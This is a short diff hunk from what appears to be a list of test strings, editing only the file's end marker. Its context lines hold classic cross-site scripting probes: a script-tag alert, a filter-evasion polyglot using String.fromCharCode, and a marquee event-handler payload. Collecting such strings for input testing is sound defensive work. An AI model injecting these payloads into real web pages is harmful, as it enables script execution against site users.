@@ -2724,5 +2724,3 @@ foo<script>alert(1)</script>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <marquee onstart='javascript:alert('1');'>=(◕_◕)=
 ```
-
---end--
